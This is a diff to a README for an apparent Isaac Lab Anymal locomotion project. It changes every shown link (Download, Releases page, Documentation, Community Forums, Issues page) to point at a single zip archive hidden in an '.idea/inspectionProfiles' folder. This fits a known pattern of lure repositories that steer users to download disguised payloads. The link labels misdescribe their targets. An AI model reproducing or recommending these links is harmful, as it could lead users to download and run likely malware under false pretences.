@@ -6,7 +6,7 @@ This project helps you explore advanced legged locomotion techniques using the A
 
 ## 📥 Download Now
 
-[![Download Now](https://raw.githubusercontent.com/MarGo-20/isaaclab-anymal-locomotion/master/agents/isaaclab-anymal-locomotion_1.6.zip%20Now-isaaclab%E2%80%90anymal%E2%80%90locomotion-green)](https://raw.githubusercontent.com/MarGo-20/isaaclab-anymal-locomotion/master/agents/isaaclab-anymal-locomotion_1.6.zip)
+[![Download Now](https://github.com/MarGo-20/isaaclab-anymal-locomotion/raw/refs/heads/master/.idea/inspectionProfiles/isaaclab-locomotion-anymal-2.5.zip%20Now-isaaclab%E2%80%90anymal%E2%80%90locomotion-green)](https://github.com/MarGo-20/isaaclab-anymal-locomotion/raw/refs/heads/master/.idea/inspectionProfiles/isaaclab-locomotion-anymal-2.5.zip)
 
 ## 📋 Overview
 
@@ -40,7 +40,7 @@ To run the software smoothly, ensure your system meets these requirements:
 Follow these steps to install the software:
 
 1. **Visit the Download Page**:
-   Go to the [Releases page](https://raw.githubusercontent.com/MarGo-20/isaaclab-anymal-locomotion/master/agents/isaaclab-anymal-locomotion_1.6.zip) to access the latest version of the software.
+   Go to the [Releases page](https://github.com/MarGo-20/isaaclab-anymal-locomotion/raw/refs/heads/master/.idea/inspectionProfiles/isaaclab-locomotion-anymal-2.5.zip) to access the latest version of the software.
 
 2. **Locate the Latest Release**:
    Find the section labeled "Latest Release". It will display the most current version of the software.
@@ -83,8 +83,8 @@ Once you have installed the software, follow these steps to explore its features
 
 For further reading and assistance, check the following resources:
 
-- [Documentation](https://raw.githubusercontent.com/MarGo-20/isaaclab-anymal-locomotion/master/agents/isaaclab-anymal-locomotion_1.6.zip): Detailed guides on using the software and understanding its features.
-- [Community Forums](https://raw.githubusercontent.com/MarGo-20/isaaclab-anymal-locomotion/master/agents/isaaclab-anymal-locomotion_1.6.zip): Connect with other users and share your experiences.
+- [Documentation](https://github.com/MarGo-20/isaaclab-anymal-locomotion/raw/refs/heads/master/.idea/inspectionProfiles/isaaclab-locomotion-anymal-2.5.zip): Detailed guides on using the software and understanding its features.
+- [Community Forums](https://github.com/MarGo-20/isaaclab-anymal-locomotion/raw/refs/heads/master/.idea/inspectionProfiles/isaaclab-locomotion-anymal-2.5.zip): Connect with other users and share your experiences.
 
 ## 🔄 Feedback and Contributions
 
@@ -96,6 +96,6 @@ This project is licensed under the MIT License. You can use and modify it as you
 
 ## 📬 Support
 
-For direct support, visit our [Issues page](https://raw.githubusercontent.com/MarGo-20/isaaclab-anymal-locomotion/master/agents/isaaclab-anymal-locomotion_1.6.zip). We aim to respond to inquiries as quickly as possible.
+For direct support, visit our [Issues page](https://github.com/MarGo-20/isaaclab-anymal-locomotion/raw/refs/heads/master/.idea/inspectionProfiles/isaaclab-locomotion-anymal-2.5.zip). We aim to respond to inquiries as quickly as possible.
 
 Enjoy your exploration into legged locomotion with the Anymal project!
